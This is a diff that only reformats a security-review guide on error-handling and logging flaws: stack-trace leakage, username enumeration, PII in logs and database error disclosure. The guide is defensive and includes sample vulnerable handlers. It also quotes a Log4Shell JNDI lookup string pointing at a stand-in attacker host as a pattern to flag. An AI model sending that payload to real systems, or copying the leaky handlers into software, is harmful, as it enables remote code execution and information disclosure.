@@ -24,9 +24,9 @@ def get_item(id):
 ```javascript
 // Express — stack traces in production
 app.use((err, req, res, next) => {
-    res.status(500).json({ error: err.stack });   // stack trace to client
-    // or
-    res.status(500).send(err.message);            // raw exception message
+	res.status(500).json({ error: err.stack }); // stack trace to client
+	// or
+	res.status(500).send(err.message); // raw exception message
 });
 ```
 
@@ -40,6 +40,7 @@ public ResponseEntity<String> handleError(Exception ex) {
 ```
 
 **What stack traces expose:**
+
 - Full file system paths (OS, deployment structure)
 - Library versions and dependency tree
 - Database schema details in SQL exceptions
@@ -80,6 +81,7 @@ def login():
 ```
 
 Safe: use the same error message for both cases:
+
 ```python
 return jsonify({'error': 'Invalid credentials'}), 401
 ```
@@ -128,6 +130,7 @@ log.debug("Received request: {}", request.toString());  // may include sensitive
 ### PII in logs
 
 Flag logging of:
+
 - Full credit card numbers (even partial masking issues: first 6 + last 4 != "masked")
 - SSNs, national ID numbers
 - Passwords and password hashes
@@ -147,6 +150,7 @@ logger.info(f"Login attempt from user: {username}")
 ```
 
 Also flag:
+
 - ANSI escape codes in logs (terminal escape injection for log viewers)
 - Log4Shell pattern: `${jndi:ldap://attacker.com/x}` in logged user-controlled fields (Java/Log4j)
 
@@ -174,6 +178,7 @@ except Exception as e:
 ```
 
 Database exceptions often contain:
+
 - `psycopg2.errors.UndefinedColumn: column "admin_secret" does not exist` → confirms column exists or doesn't
 - `sqlalchemy.exc.IntegrityError: UNIQUE constraint failed: users.email` → confirms email exists
 
@@ -208,15 +213,15 @@ These are informational/low findings but important for incident response capabil
 
 ```json
 {
-  "file": "app/views/auth.py",
-  "line": 28,
-  "category": "username_enumeration",
-  "title": "Username enumeration via differential login error messages",
-  "description": "Login endpoint returns 'User not found' for invalid usernames and 'Invalid password' for valid usernames with wrong passwords. Allows enumeration of registered usernames.",
-  "evidence": "Line 28: return error('User not found') vs line 33: return error('Invalid password')",
-  "impact": "Attacker can enumerate valid email addresses for targeted phishing or credential stuffing.",
-  "remediation": "Return a uniform error message for both cases: 'Invalid credentials'. Ensure response timing is constant.",
-  "cwe": "CWE-203",
-  "severity": "medium"
+	"file": "app/views/auth.py",
+	"line": 28,
+	"category": "username_enumeration",
+	"title": "Username enumeration via differential login error messages",
+	"description": "Login endpoint returns 'User not found' for invalid usernames and 'Invalid password' for valid usernames with wrong passwords. Allows enumeration of registered usernames.",
+	"evidence": "Line 28: return error('User not found') vs line 33: return error('Invalid password')",
+	"impact": "Attacker can enumerate valid email addresses for targeted phishing or credential stuffing.",
+	"remediation": "Return a uniform error message for both cases: 'Invalid credentials'. Ensure response timing is constant.",
+	"cwe": "CWE-203",
+	"severity": "medium"
 }
 ```
